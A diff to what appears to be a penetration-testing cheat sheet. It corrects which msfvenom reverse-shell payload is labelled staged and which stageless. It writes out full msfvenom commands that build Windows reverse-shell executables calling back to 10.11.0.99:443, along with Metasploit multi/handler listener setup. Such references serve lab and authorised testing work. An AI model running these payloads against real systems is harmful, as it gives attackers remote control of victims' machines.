@@ -462,18 +462,6 @@ accesschk.exe -uwcqv "Authenticated Users" C:\*.* /accepteula
 * x86
 	* Stageless
 	```
-	msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=10.11.0.99 LPORT=443 -b "\x00" -f exe -o shell.exe
-	```
-	Set up Listener in msfvenom
-	```
-	> use multi/handler
-	> set LHOST 10.11.0.99
-	> set LPORT 443
-	> set payload windows/meterpreter/reverse_tcp
-	> run
-	```
-	* Staged
-	```
 	msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=10.11.0.99 LPORT=443 -b "\x00" -f exe -o shell.exe
 	```
 	Set up Listener in msfvenom
@@ -484,6 +472,19 @@ accesschk.exe -uwcqv "Authenticated Users" C:\*.* /accepteula
 	> set payload windows/shell_reverse_tcp
 	> run
 	```
+	* Staged
+	```
+	msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp  LHOST=10.11.0.99 LPORT=443 -b "\x00" -f exe -o shell.exe
+	```
+	Set up Listener in msfvenom
+	```
+	> use multi/handler
+	> set LHOST 10.11.0.99
+	> set LPORT 443
+	> set payload windows/meterpreter/reverse_tcp
+	> run
+	```
+
 [Back](#summary)
 
 ## Compiling Exploits
